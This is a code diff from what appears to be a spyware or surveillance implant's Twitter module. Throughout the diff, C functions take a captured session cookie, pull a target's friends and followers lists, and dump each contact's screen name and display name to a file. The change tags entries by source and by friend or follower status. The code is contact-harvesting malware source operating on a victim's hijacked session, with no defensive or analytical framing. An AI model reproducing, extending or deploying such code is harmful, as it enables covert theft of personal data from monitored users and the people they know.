@@ -13,13 +13,15 @@ extern BOOL bPM_MailCapStarted;
 
 extern DWORD GetLastFBTstamp(char *user, DWORD *hi_part);
 extern void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi);
-extern BOOL DumpContact(HANDLE hfile, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page);
+extern BOOL DumpContact(HANDLE hfile, DWORD program, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page, DWORD flags);
 extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp
 
+#define TWITTER_FOLLOWER 1
+#define TWITTER_FRIEND   0
 #define TW_CONTACT_ID1 "\"screen_name\":\""
 #define TW_CONTACT_ID2 "\"name\":\""
 #define TW_ID_LIMIT 95
-DWORD ParseCategory(char *user, char *category, char *cookie)
+DWORD ParseCategory(char *user, char *category, char *cookie, DWORD flags)
 {
 	DWORD ret_val;
 	BYTE *r_buffer = NULL, *r_buffer_inner = NULL;
@@ -111,7 +113,7 @@ DWORD ParseCategory(char *user, char *category, char *cookie)
 			contact_name_w = UTF8_2_UTF16(contact_name);
 			screen_name_w = UTF8_2_UTF16(screen_name);
 
-			DumpContact(hfile, screen_name_w, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, contact_name_w);
+			DumpContact(hfile, CONTACT_SRC_TWITTER, screen_name_w, NULL, NULL, NULL, NULL, NULL, NULL, NULL, contact_name_w, NULL, flags);
 		
 			SAFE_FREE(contact_name_w);
 			SAFE_FREE(screen_name_w);
@@ -162,8 +164,8 @@ DWORD HandleTwitterContacts(char *cookie)
 	SAFE_FREE(r_buffer);
 	scanned = TRUE;
 
-	ParseCategory(user, "friends", cookie);
-	return ParseCategory(user, "followers", cookie);
+	ParseCategory(user, "friends", cookie, TWITTER_FRIEND);
+	return ParseCategory(user, "followers", cookie, TWITTER_FOLLOWER);
 }
 
 #define TW_TWEET_BODY "\"text\":\""
